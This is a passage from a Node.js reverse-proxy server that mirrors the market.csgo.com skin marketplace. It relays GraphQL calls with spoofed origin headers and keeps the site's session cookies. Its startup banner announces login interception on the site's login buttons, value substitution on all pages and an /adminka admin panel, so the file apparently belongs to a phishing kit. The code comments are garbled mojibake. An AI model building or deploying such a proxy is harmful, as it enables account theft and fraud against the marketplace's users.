                'origin': 'https://market.csgo.com',
                'referer': 'https://market.csgo.com/',
                'content-type': 'application/json',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': req.headers['user-agent'] || 'Mozilla/5.0',
                'cookie': createCookieString(requestCookies),
                'connection': 'keep-alive'
            },
            data: req.body,
            responseType: 'json',
            validateStatus: () => true, // –ü—Ä–∏–Ω–∏–º–∞–µ–º –ª—é–±–æ–π —Å—Ç–∞—Ç—É—Å –æ—Ç–≤–µ—Ç–∞
            maxRedirects: 0,
            timeout: 30000,
            httpsAgent: httpsAgent
        };
        
        // –£–¥–∞–ª—è–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏ –ø—Ä–æ–∫—Å–∏
        delete axiosConfig.headers['x-forwarded-for'];
        delete axiosConfig.headers['x-forwarded-proto'];
        delete axiosConfig.headers['x-forwarded-host'];
        
        // –ò–°–ü–†–ê–í–õ–ï–ù–û: –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–≤—Ç–æ—Ä–Ω—ã–µ –ø–æ–ø—ã—Ç–∫–∏ –¥–ª—è GraphQL –∑–∞–ø—Ä–æ—Å–æ–≤
        let retries = 0;
        const maxRetries = 3;
        let response = null;
        let lastError = null;
        
        while (retries < maxRetries) {
            try {
                if (retries > 0) {
                    console.log(`GraphQL retry ${retries}/${maxRetries} for ${req.originalUrl}`);
                    await new Promise(resolve => setTimeout(resolve, 1000 * retries)); // –£–≤–µ–ª–∏—á–∏–≤–∞—é—â–∞—è—Å—è –∑–∞–¥–µ—Ä–∂–∫–∞
                }
                
                response = await axios(axiosConfig);
                
                // –ï—Å–ª–∏ —É—Å–ø–µ—à–Ω–æ, –≤—ã—Ö–æ–¥–∏–º –∏–∑ —Ü–∏–∫–ª–∞
                if (response.status !== 500) {
                    break;
                }
                
                console.warn(`GraphQL returned 500, retry ${retries + 1}/${maxRetries}`);
                retries++;
                
            } catch (error) {
                console.error(`GraphQL request failed (attempt ${retries + 1}/${maxRetries}):`, error.message);
                lastError = error;
                retries++;
                
                if (retries >= maxRetries) {
                    throw error;
                }
            }
        }
        
        // –ï—Å–ª–∏ –Ω–µ —Å–º–æ–≥–ª–∏ –ø–æ–ª—É—á–∏—Ç—å –æ—Ç–≤–µ—Ç –ø–æ—Å–ª–µ –≤—Å–µ—Ö –ø–æ–ø—ã—Ç–æ–∫
        if (!response) {
            throw lastError || new Error('Failed after max retries');
        }
        
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º cookies –∏–∑ –æ—Ç–≤–µ—Ç–∞
        if (response.headers['set-cookie']) {
            const newCookies = parseSetCookieHeaders(response.headers['set-cookie']);
            newCookies.forEach((value, name) => {
                session.cookies.set(name, value);
            });
        }
        
        // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º sessionId cookie –µ—Å–ª–∏ –µ—ë –Ω–µ—Ç
        if (!req.cookies.sessionId) {
            res.cookie('sessionId', sessionId, { 
                httpOnly: true, 
                secure: isSecure(req),
                sameSite: isSecure(req) ? 'none' : 'lax'
            });
        }
        
        // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏
        Object.entries(response.headers).forEach(([key, value]) => {
            if (!['content-encoding', 'content-length', 'transfer-encoding'].includes(key.toLowerCase())) {
                res.set(key, value);
            }
        });
        
        // –ò–°–ü–†–ê–í–õ–ï–ù–û: –°–ø–µ—Ü–∏–∞–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ GraphQL –æ—à–∏–±–æ–∫
        if (response.data && response.data.errors) {
            console.warn('GraphQL responded with errors:', JSON.stringify(response.data.errors));
            
            // –ï—Å–ª–∏ —ç—Ç–æ –æ—à–∏–±–∫–∞ viewItem - –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –ø—É—Å—Ç–æ–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤–º–µ—Å—Ç–æ –æ—à–∏–±–∫–∏
            if (JSON.stringify(response.data.errors).includes('viewItem')) {
                console.log('Replacing viewItem error with empty response');
                response.data = { data: { viewItem: null } };
            }
        }
        
        res.status(response.status);
        res.json(response.data);
        
    } catch (error) {
        console.error('‚ùå GraphQL error:', error.message);
        // –í–æ–∑–≤—Ä–∞—â–∞–µ–º –∫–ª–∏–µ–Ω—Ç—É –æ–±–æ–±—â–µ–Ω–Ω—ã–π –æ—Ç–≤–µ—Ç —Å –ø—É—Å—Ç—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏
        res.status(200).json({ 
            data: {},
            errors: [{ message: 'GraphQL proxy error, please retry' }]
        });
    }
});

// –î–æ–±–∞–≤–ª–µ–Ω–∞ –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –æ—á–∏—Å—Ç–∫–∞ —É—Å—Ç–∞—Ä–µ–≤—à–∏—Ö —Å–µ—Å—Å–∏–π
setInterval(() => {
    const now = Date.now();
    let cleaned = 0;

    sessions.forEach((session, id) => {
        if (session.lastAccess && now - session.lastAccess > 24 * 60 * 60 * 1000) { // –°—Ç–∞—Ä—à–µ 24 —á–∞—Å–æ–≤
            sessions.delete(id);
            cleaned++;
        }
    });

    if (cleaned > 0) {
        console.log(`üßπ Cleaned ${cleaned} expired sessions`);
    }
}, 60 * 60 * 1000); // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–∂–¥—ã–π —á–∞—Å

// –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
    üöÄ Advanced Market Proxy Server (IMPROVED VERSION WITH ADMIN PANEL)
    üì° Port: ${PORT}
    üéØ Target: ${TARGET_HOST}
    üîå WebSocket: ${WS_TARGET}
    üîí HTTPS: Auto-detected
    üë®‚Äçüíº Admin Panel: ${isSecure({ headers: {} }) ? 'https' : 'http'}://localhost:${PORT}/adminka
    üîë Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat, #login-head
    ‚úÖ Instant value substitution: Enabled for all pages
    `);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\nüîÑ Shutting down gracefully...');
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–µ—Ä–µ–¥ –≤—ã–∫–ª—é—á–µ–Ω–∏–µ–º
    saveCustomPages();
    server.close(() => {
        console.log('‚úÖ Server closed');
        process.exit(0);
    });
});
